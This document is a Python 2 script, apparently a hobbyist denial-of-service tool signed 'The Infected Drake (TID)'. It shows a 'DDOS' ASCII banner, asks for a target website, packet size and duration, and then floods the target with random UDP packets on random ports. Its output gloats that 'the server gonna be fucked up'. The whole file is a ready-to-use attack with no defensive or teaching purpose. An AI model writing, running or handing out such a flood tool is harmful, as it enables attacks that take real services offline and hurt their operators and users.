import socket
import random
import sys
import time
import os

from time import sleep

if sys.platform == "linux2":
	os.system("clear")
elif sys.platform == "win32":
	os.system("cls")
else:
	os.system("clear")
###############################
class color:
   PURPLE = '\033[95m'
   CYAN = '\033[96m'
   DARKCYAN = '\033[36m'
   BLUE = '\033[94m'
   GREEN = '\033[92m'
   YELLOW = '\033[93m'
   RED = '\033[91m'
   BOLD = '\033[1m'
   UNDERLINE = '\033[4m'
   END = '\033[0m'
   HEADER = '\033[95m'
   OKBLUE = '\033[94m'
   OKGREEN = '\033[92m'
   WARNING = '\033[93m'
   FAIL = '\033[91m'
W  = '\033[0m'  # white (normal)
R  = '\033[31m' # red
G  = '\033[32m' # green
O  = '\033[33m' # orange
B  = '\033[34m' # blue
P  = '\033[35m' # purple
C  = '\033[36m' # cyan
GR = '\033[37m' # gray
T  = '\033[93m' # tan
M = '\033[1;35;32m' # magenta
###############################
def UDoS():
	print ""
	time.sleep(0.1)
	print ""
	time.sleep(0.1)
	print ""+M+"              .------------------..------------------..------------------..------------------."
	time.sleep(0.1)
	print color.YELLOW + "              | .--------------. || .--------------. || .--------------. || .--------------. |"
	time.sleep(0.1)
	print color.RED + "              | |  ________    | || |  ________    | || |     ____     | || |    _______   | |"
	time.sleep(0.1)
	print color.RED + "              | | |_   ___ `.  | || | |_   ___ `.  | || |   .'    `.   | || |   /  ___  |  | |"
	time.sleep(0.1)
	print color.BLUE + "              | |   | |   `. \ | || |   | |   `. \ | || |  /  .--.  \  | || |  |  (__ \_|  | |"
	time.sleep(0.1)
	print color.BLUE + "              | |   | |    | | | || |   | |    | | | || |  | |    | |  | || |   '.___`-.   | |"
	time.sleep(0.1)
	print color.RED + "              | |  _| |___.' / | || |  _| |___.' / | || |  \  `--'  /  | || |  |`\____) |  | |"
	time.sleep(0.1)
	print color.RED + "              | | |________.'  | || | |________.'  | || |   `.____.'   | || |  |_______.'  | |"
	time.sleep(0.1)
	print color.RED + "              | |              | || |              | || |              | || |              | |"
	time.sleep(0.1)
	print color.YELLOW + "              | '--------------' || '--------------' || '--------------' || '--------------' |"
	time.sleep(0.1)
	print ""+M+"              '------------------''------------------''------------------''------------------'"
	time.sleep(0.1)
	print ''
	print ''
	target = raw_input(color.PURPLE + color.BOLD +"                          Target (Enter website address to be DDoS'ed):> ")
       	host_ip=socket.gethostbyname(target)
	print(color.RED + "                                         Target set ---> %s " % (target))
	print("                  +=====================================================================+")
	time.sleep(0.3)
	print ""
	package = input(color.BLUE + color.BOLD +"                                         Size (MAX 65507): ")
	print(color.RED + "                      Target to be attacked with packets of data --->  %s" % (package))
	print("                  +=====================================================================+")
	time.sleep(0.3)
	print ""
	duration = input(color.GREEN + color.BOLD +"                                   Duration (0 is infinite): ")
	print(color.RED + "                            Time duration of the attack ---> %s " % (duration) + color.END)
	durclock = (lambda:0, time.clock)[duration > 0]
	duration = (1, (durclock() + duration))[duration > 0]
	packet = random._urandom(package)
	sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	print("                  +=====================================================================+")
	print ""
	print("               The UDP flood started on %s with %s bytes for %s seconds." % (target, package, duration))
	while True:
	        if (durclock() < duration):
	                print(color.BLUE + "                            The Flood Attack is on, the server gonna be fucked up... ;) " + color.END)
	                port = random.randint(1, 65535)
	                sock.sendto(packet, (target, port))
	        else:
	                break
	print color.YELLOW + "                  +=====================================================================+" + color.END
	print ""+M+"                        The UDP flood has completed on %s for %s seconds." % (target, duration)
	time.sleep(0.3)
	print color.RED +"                               This is normal simple DoS attack at the UDP level..."
	time.sleep(0.3)
	print color.CYAN + "                                     << Remember The Infected Drake (TID) >>"
	time.sleep(0.3)
	print color.PURPLE + "                                         Shutting down ... Goodbye ^_^ "
	print color.YELLOW + "             +==============================================================================+" + color.END
